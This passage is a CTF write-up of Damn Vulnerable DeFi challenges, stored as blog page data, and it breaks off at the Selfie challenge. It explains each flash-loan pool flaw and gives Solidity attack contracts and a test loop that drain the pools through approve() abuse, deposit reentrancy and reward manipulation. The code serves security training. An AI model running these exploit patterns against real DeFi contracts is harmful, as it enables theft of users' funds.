{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/CTFs/DamnVulnerableDefi/DamnVulnerableDefi_WriteUp/",
    "result": {"data":{"cur":{"id":"296019a3-1f90-5bbc-a9e9-f8d9cd4bf8cf","html":"<h1 id=\"ctf-name-damn-vulnerable-defi\" style=\"position:relative;\"><a href=\"#ctf-name-damn-vulnerable-defi\" aria-label=\"ctf name damn vulnerable defi permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CTF name: Damn Vulnerable DeFi</h1>\n<h2 id=\"challenge-name-unstoppable\" style=\"position:relative;\"><a href=\"#challenge-name-unstoppable\" aria-label=\"challenge name unstoppable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge name: Unstoppable</h2>\n<h3 id=\"challenge-description\" style=\"position:relative;\"><a href=\"#challenge-description\" aria-label=\"challenge description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge description:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">There's a lending pool with a million DVT tokens in balance, offering flash loans for free.\n\nIf only there was a way to attack and stop the pool from offering flash loans ...\n\nYou start with 100 DVT tokens in balance.</code></pre></div>\n<br>\n<p>In this challenge, we need to attack and stop the pool from offering flash loans. <code class=\"language-text\">UnstoppableLender contract</code> consist of two functions, which is <code class=\"language-text\">depositTokens()</code> function and <code class=\"language-text\">flashLoan()</code> function. The vulnerability is included in <code class=\"language-text\">flashLoan()</code> function.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">    <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span>poolBalance <span class=\"token operator\">==</span> balanceBefore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<br>\n<p>This line of code in <code class=\"language-text\">flashLoan()</code> function compares <code class=\"language-text\">poolBalance</code> and <code class=\"language-text\">balanceBefore</code>. If they are not equal to each other it reverts. <code class=\"language-text\">poolBalance</code> is only update by <code class=\"language-text\">depositTokens()</code> function and <code class=\"language-text\">balanceBefore</code> is calculated by <code class=\"language-text\">damnValuableToken.balanceOf(address(this))</code> inside of flashLoan. If we send some tokens to UnstoppableLender contratct, <code class=\"language-text\">flashLoan()</code> function and <code class=\"language-text\">poolBalance</code> never going to match.</p>\n<hr>\n<h2 id=\"challenge-name-naive-receiver\" style=\"position:relative;\"><a href=\"#challenge-name-naive-receiver\" aria-label=\"challenge name naive receiver permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge name: Naive-Receiver</h2>\n<h3 id=\"challenge-description-1\" style=\"position:relative;\"><a href=\"#challenge-description-1\" aria-label=\"challenge description 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge description:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.\n\nYou also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.\n\nDrain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)</code></pre></div>\n<br>\n<p>In this challenge, we need Drain all ETH funds from the user’s contract(FlashLoanReceiver.sol). In <code class=\"language-text\">NaiveReceiverLenderPool</code> contract, the flashLoan() function does not check if borrower is a authorized user. Since <code class=\"language-text\">flashLoan()</code> function do not authenticate, we can execute flashLoan with any contract address as borrower. We just need to repeat calling flashLoan function with user’s contract address. Here is test code to exploit.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> async <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span><span class=\"token number\">10</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>pool<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>await <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>receiver<span class=\"token punctuation\">.</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<br>\n<hr>\n<h2 id=\"challenge-name-truster\" style=\"position:relative;\"><a href=\"#challenge-name-truster\" aria-label=\"challenge name truster permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge name: Truster</h2>\n<h3 id=\"challenge-description-2\" style=\"position:relative;\"><a href=\"#challenge-description-2\" aria-label=\"challenge description 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge description:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.\n\nCurrently the pool has 1 million DVT tokens in balance. And you have nothing.\n\nBut don't worry, you might be able to take them all from the pool. In a single transaction.</code></pre></div>\n<br>\n<p>In this challenge, we need to take all 1 million DVT token from the pool. This pool offers flashLoan and it allows any function call to be executed during the flash loan. Since we can call any function from <code class=\"language-text\">TrusterLenderPool contract</code>, we can call <code class=\"language-text\">approve()</code> function of DVT token contract. Here is attack contract.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">AttackTruster</span><span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attackTrusterLenderPool</span><span class=\"token punctuation\">(</span>IERC20 token<span class=\"token punctuation\">,</span> TrusterLenderPool pool<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> attacker<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token function\">beforeAfter</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint256</span> balance <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> approveData <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"approve(address,uint256)\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        pool<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> approveData<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">,</span> balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<br>\n<p>Here is how it goes. We first get the balance of DVT token of pool and get payload of <code class=\"language-text\">approve()</code> function that allows attacker can withdraw the DVT tokens. Since pool will be the caller of approve function, it does not revert. Then execute flashloan. The first argement of flashLoan function should be 0, so we do not have to payback. All after that, we can withdraw 1 million DVT token using <code class=\"language-text\">transferFrom()</code> function.</p>\n<hr>\n<h2 id=\"challenge-name-side-entrance\" style=\"position:relative;\"><a href=\"#challenge-name-side-entrance\" aria-label=\"challenge name side entrance permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge name: Side entrance</h2>\n<h3 id=\"challenge-description-3\" style=\"position:relative;\"><a href=\"#challenge-description-3\" aria-label=\"challenge description 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge description:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.\n\nThis very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.\n\nYou must take all ETH from the lending pool.</code></pre></div>\n<br>\n<p>In this challenge, we must take all ETH from the lending pool. <code class=\"language-text\">SideEntranceLenderPool contract</code> provides flashloan just like previous contracts. This pool contract also contains <code class=\"language-text\">deposit()</code> function and <code class=\"language-text\">withdraw()</code> function as well. The vulnerability comes from <code class=\"language-text\">deposit()</code> function. It increases balance of <code class=\"language-text\">msg.sender</code>, however, it does not check if the balance of pool has really increased.</p>\n<p>There is a line of code in <code class=\"language-text\">flashLoan()</code>:  <code class=\"language-text\">IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();</code>. This line of code allows <code class=\"language-text\">msg.sender</code> to execute <code class=\"language-text\">execute()</code> function from itself. We can call <code class=\"language-text\">deposit()</code> function during flash loan to increase balance of ourselves, and we can withdraw.</p>\n<p>Here is attack contract:</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">FlashLoanEtherReceiver</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">SideEntranceLenderPool</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attackSideEntranceLenderPool</span><span class=\"token punctuation\">(</span>SideEntranceLenderPool pool<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> attacker<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        pool<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        pool<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<br>\n<p>By calling, attackSideEntranceLenderPool, we execute flashLoan, and during flashLoan, it will execute <code class=\"language-text\">execute()</code> function from attack contract which will deposit flash loan amount. Then we withdraw from the pool and send stolen ETH to attacker.</p>\n<hr>\n<h2 id=\"challenge-name-the-rewarder\" style=\"position:relative;\"><a href=\"#challenge-name-the-rewarder\" aria-label=\"challenge name the rewarder permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge name: The rewarder</h2>\n<h3 id=\"challenge-description-4\" style=\"position:relative;\"><a href=\"#challenge-description-4\" aria-label=\"challenge description 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge description:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.\n\nAlice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!\n\nYou don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.\n\nOh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?</code></pre></div>\n<br>\n<p>In this challenge, we must claim most rewards for ourselves with no DVT token. The challenge also provides flash loan and reward pool. We need to keep an eye on reward pool, <code class=\"language-text\">TheRewarderPool.sol</code>. After deposit DVT token for 5 days, we can get rewards. However, there are already rewards in the pool from previous round, and rewarders have not claimed the reward.\nIf we flashloan massive amount of DVT, and deposit to the rewarder pool, we will get most of the reward token.</p>\n<p>First, we will borrow max amount of DVT from flashloan, and we will deposit it to rewarder pool. <code class=\"language-text\">deposit()</code> function will trigger <code class=\"language-text\">distributeRewards()</code> function, and since we have deposited very large amount of DVT the it will mint most of reward token. This is possible because <code class=\"language-text\">_hasRetrievedReward()</code> function can not fully validate retrieved address. Finally, we just repay flash loan, and send reward token to attacker. Here is attack contract:ß</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">AttackTheRewarder</span> <span class=\"token punctuation\">{</span>\n    \n    <span class=\"token builtin\">address</span> flashLoanerPool<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> theRewarderPool<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> rewardToken<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> liquidity<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _flashLoanerPool<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _rewardToken<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _liquidity<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _theRewarderPool<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        flashLoanerPool <span class=\"token operator\">=</span> _flashLoanerPool<span class=\"token punctuation\">;</span>\n        rewardToken <span class=\"token operator\">=</span> _rewardToken<span class=\"token punctuation\">;</span>\n        liquidity <span class=\"token operator\">=</span> _liquidity<span class=\"token punctuation\">;</span>\n        theRewarderPool <span class=\"token operator\">=</span> _theRewarderPool<span class=\"token punctuation\">;</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attackTheRewarder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint256</span> amount <span class=\"token operator\">=</span> <span class=\"token function\">DamnValuableToken</span><span class=\"token punctuation\">(</span>liquidity<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>flashLoanerPool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">FlashLoanerPool</span><span class=\"token punctuation\">(</span>flashLoanerPool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveFlashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">DamnValuableToken</span><span class=\"token punctuation\">(</span>liquidity<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>theRewarderPool<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">TheRewarderPool</span><span class=\"token punctuation\">(</span>theRewarderPool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">TheRewarderPool</span><span class=\"token punctuation\">(</span>theRewarderPool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">DamnValuableToken</span><span class=\"token punctuation\">(</span>liquidity<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>flashLoanerPool<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> rewardAmount <span class=\"token operator\">=</span> <span class=\"token function\">RewardToken</span><span class=\"token punctuation\">(</span>rewardToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">RewardToken</span><span class=\"token punctuation\">(</span>rewardToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> rewardAmount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<br>\n<hr>\n<h2 id=\"challenge-name-selfie\" style=\"position:relative;\"><a href=\"#challenge-name-selfie\" aria-label=\"challenge name selfie permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge name: Selfie</h2>\n<h3 id=\"challenge-description-5\" style=\"position:relative;\"><a href=\"#challenge-description-5\" aria-label=\"challenge description 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge description:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">A new cool lending pool has launched! It's now offering flash loans of DVT tokens.\n\nWow, and it even includes a really fancy governance mechanism to control it.\n\nWhat could go wrong, right ?\n\nYou start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.</code></pre></div>\n<br>\n<p>In this challenge, we must 